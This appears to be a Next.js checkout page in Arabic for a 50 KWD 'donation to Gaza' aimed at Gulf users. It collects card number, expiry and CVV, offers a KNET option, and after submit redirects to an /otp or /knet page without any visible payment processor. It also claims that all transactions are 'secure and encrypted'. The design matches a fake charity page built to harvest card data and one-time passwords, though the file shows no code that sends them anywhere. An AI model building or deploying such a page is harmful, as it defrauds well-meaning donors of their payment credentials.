/* eslint-disable */
"use client"

import type React from "react"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { ChevronDown, CreditCard, Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { processDonation } from "../actions"

export default function CheckoutPage() {
    const router = useRouter()

    const [isLoading, setIsLoading] = useState(false)
    const [isGccOpen, setIsGccOpen] = useState(false)
    const [paymentMethod, setPaymentMethod] = useState("credit-card")
    const [formData, setFormData] = useState({
        name: "",
        email: "",
        phoneNumber: "",
        cardNumber: "",
        expiryDate: "",
        cvv: "",
        country: "kuwait",
    })

    const donationAmount = 50
    const projectName = "تبرع  لغزة"

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target
        setFormData((prev) => ({ ...prev, [name]: value }))
    }

    const handleSelectChange = (name: string, value: string) => {
        setFormData((prev) => ({ ...prev, [name]: value }))
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        setIsLoading(true)

        try {
            // Create form data to send to server action
            const formDataToSubmit = new FormData()
            formDataToSubmit.append("name", formData.name)
            formDataToSubmit.append("email", formData.email)
            formDataToSubmit.append("phoneNumber", formData.phoneNumber)
            formDataToSubmit.append("amount", donationAmount.toString())
            formDataToSubmit.append("projectName", projectName)
            formDataToSubmit.append("paymentMethod", paymentMethod)

            // Process donation
            const result = await processDonation(formDataToSubmit)

            if (result.success) {


                // Redirect to success page
                setTimeout(() => {
                    if (paymentMethod === 'knet') {
                        router.push(`/knet`)

                    } else {
                        router.push(`/otp`)

                    }
                }, 1500)
            } else {

            }
        } catch (error) {
            console.error("Error submitting donation:", error)

        } finally {
            setIsLoading(false)
        }
    }

    return (
        <div className="flex flex-col min-h-screen bg-gray-50 text-right" dir="rtl">

            <main className="flex-1 max-w-3xl mx-auto w-full p-4 py-8">
                <div className="grid md:grid-cols-5 gap-8">
                    {/* Payment Form */}
                    <div className="md:col-span-3">
                        <Card dir="rtl">
                            <CardHeader>
                                <CardTitle>معلومات الدفع</CardTitle>
                                <CardDescription>يرجى إدخال بيانات الدفع الخاصة بك</CardDescription>
                            </CardHeader>
                            <CardContent>
                                <form onSubmit={handleSubmit} className="space-y-6">
                                    <div className="space-y-4">
                                        <div className="grid grid-cols-2 gap-4">
                                            <div className="space-y-2">
                                                <Label htmlFor="name">الاسم</Label>
                                                <Input
                                                    id="name"
                                                    name="name"
                                                    placeholder="الاسم الكامل"
                                                    value={formData.name}
                                                    onChange={handleInputChange}
                                                />
                                            </div>
                                            <div className="space-y-2">
                                                <Label htmlFor="email">البريد الإلكتروني</Label>
                                                <Input
                                                    id="email"
                                                    name="email"
                                                    type="email"
                                                    placeholder="example@domain.com"
                                                    value={formData.email}
                                                    onChange={handleInputChange}
                                                />
                                            </div>
                                        </div>

                                        <div className="space-y-2">
                                            <Label htmlFor="phoneNumber">رقم الهاتف (اختياري)</Label>
                                            <Input
                                                id="phoneNumber"
                                                name="phoneNumber"
                                                placeholder="رقم الهاتف"
                                                value={formData.phoneNumber}
                                                onChange={handleInputChange}
                                            />
                                        </div>

                                        <div className="space-y-2" >
                                            <Label>طريقة الدفع</Label>
                                            <RadioGroup
                                                value={paymentMethod}
                                                onValueChange={setPaymentMethod}
                                                className="flex flex-wrap gap-4"
                                            >
                                                <div className="flex items-center justfify-center space-x-2 space-x-reverse">
                                                    <RadioGroupItem value="credit-card" id="credit-card" />
                                                    <Label htmlFor="credit-card" className="flex items-center gap-2">
                                                        <img className="my-2" src="/visa.png" alt="apple-pay" width={25} />
                                                        <img className="my-2" src="/mas.png" alt="apple-pay" width={25} />
                                                    </Label>
                                                </div>

                                                <div className="flex items-center space-x-2 space-x-reverse">
                                                    <RadioGroupItem value="google-pay" id="google-pay" />
                                                    <img className="my-2" src="/applepay.png" alt="apple-pay" width={40} />
                                                </div>
                                                <div className="flex items-center space-x-2 space-x-reverse">
                                                    <RadioGroupItem value="knet" id="knet" />
                                                    <img className="my-2" src="/knet.png" alt="apple-pay" width={40} />
                                                </div>
                                            </RadioGroup>
                                        </div>

                                        {paymentMethod === "credit-card" && (
                                            <div className="space-y-4 border rounded-lg p-4 bg-gray-50">
                                                <div className="space-y-2">
                                                    <Label htmlFor="cardNumber">رقم البطاقة</Label>
                                                    <Input
                                                        id="cardNumber"
                                                        name="cardNumber"
                                                        placeholder="0000 0000 0000 0000"
                                                        value={formData.cardNumber}
                                                        onChange={handleInputChange}
                                                    />
                                                </div>

                                                <div className="grid grid-cols-2 gap-4">
                                                    <div className="space-y-2">
                                                        <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                                                        <Input
                                                            id="expiryDate"
                                                            name="expiryDate"
                                                            placeholder="MM/YY"
                                                            value={formData.expiryDate}
                                                            onChange={handleInputChange}
                                                        />
                                                    </div>
                                                    <div className="space-y-2">
                                                        <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
                                                        <Input
                                                            id="cvv"
                                                            name="cvv"
                                                            placeholder="123"
                                                            value={formData.cvv}
                                                            onChange={handleInputChange}
                                                        />
                                                    </div>
                                                </div>

                                                <div className="space-y-2">
                                                    <Label htmlFor="country">الدولة</Label>
                                                    <Select
                                                        value={formData.country}
                                                        onValueChange={(value: string) => handleSelectChange("country", value)}
                                                    >
                                                        <SelectTrigger id="country">
                                                            <SelectValue placeholder="اختر الدولة" />
                                                        </SelectTrigger>
                                                        <SelectContent>
                                                            <SelectItem value="kuwait">الكويت</SelectItem>
                                                            <SelectItem value="saudi">السعودية</SelectItem>
                                                            <SelectItem value="uae">الإمارات</SelectItem>
                                                            <SelectItem value="qatar">قطر</SelectItem>
                                                            <SelectItem value="bahrain">البحرين</SelectItem>
                                                            <SelectItem value="oman">عمان</SelectItem>
                                                        </SelectContent>
                                                    </Select>
                                                </div>
                                            </div>
                                        )}
                                    </div>

                                    <Button
                                        type="submit"
                                        className="w-full bg-orange-500 hover:bg-orange-600 text-white py-6 text-lg"
                                        disabled={isLoading}
                                    >
                                        {isLoading ? "جاري المعالجة..." : "تبرع الآن"}
                                    </Button>
                                </form>
                            </CardContent>
                        </Card>
                    </div>

                    {/* Order Summary */}
                    <div className="md:col-span-2">
                        <Card>
                            <CardHeader>
                                <CardTitle>ملخص التبرع</CardTitle>
                            </CardHeader>
                            <CardContent className="space-y-4">
                                <div className="flex justify-between items-center pb-4 border-b">
                                    <div className="font-medium">المشروع</div>
                                    <div className="bg-gray-200 px-3 py-1 rounded-md">{projectName}</div>
                                </div>

                                <div className="flex justify-between items-center">
                                    <div className="font-medium">المبلغ</div>
                                    <div className="flex items-center">
                                        <div className="bg-orange-500 text-white rounded-full w-6 h-6 flex items-center justify-center ml-2">
                                            <Check className="w-4 h-4" />
                                        </div>
                                        <span className="font-bold">{donationAmount} د.ك</span>
                                    </div>
                                </div>

                                <Collapsible open={isGccOpen} onOpenChange={setIsGccOpen} className="border-t border-b py-3 mt-4">
                                    <CollapsibleTrigger className="flex items-center justify-between w-full">
                                        <span>التبرع من إحدى دول مجلس التعاون</span>
                                        <ChevronDown
                                            className={`transition-transform duration-200 ${isGccOpen ? "transform rotate-180" : ""}`}
                                        />
                                    </CollapsibleTrigger>
                                    <CollapsibleContent className="pt-4">
                                        <div className="grid grid-cols-3 gap-2">
                                            <Button variant="outline" className="text-sm">
                                                الكويت
                                            </Button>
                                            <Button variant="outline" className="text-sm">
                                                السعودية
                                            </Button>
                                            <Button variant="outline" className="text-sm">
                                                الإمارات
                                            </Button>
                                            <Button variant="outline" className="text-sm">
                                                قطر
                                            </Button>
                                            <Button variant="outline" className="text-sm">
                                                البحرين
                                            </Button>
                                            <Button variant="outline" className="text-sm">
                                                عمان
                                            </Button>
                                        </div>
                                    </CollapsibleContent>
                                </Collapsible>
                            </CardContent>
                            <CardFooter className="flex flex-col">
                                <div className="text-center text-sm text-muted-foreground mb-4">جميع المعاملات آمنة ومشفرة</div>
                                <div className="flex justify-center gap-2">
                                    <Image src="/placeholder.svg?height=30&width=40" alt="Visa" width={40} height={30} />
                                    <Image src="/placeholder.svg?height=30&width=40" alt="Mastercard" width={40} height={30} />
                                    <Image src="/placeholder.svg?height=30&width=40" alt="Apple Pay" width={40} height={30} />
                                    <Image src="/placeholder.svg?height=30&width=40" alt="Google Pay" width={40} height={30} />
                                </div>
                            </CardFooter>
                        </Card>

                        <div className="mt-4 text-sm text-muted-foreground">
                            <p>
                                بالضغط على زر "تبرع الآن"، أنت توافق على{" "}
                                <Link href="#" className="text-primary hover:underline">
                                    شروط الخدمة
                                </Link>{" "}
                                و
                                <Link href="#" className="text-primary hover:underline">
                                    سياسة الخصوصية
                                </Link>
                                .
                            </p>
                        </div>
                    </div>
                </div>
            </main>


        </div>
    )
}

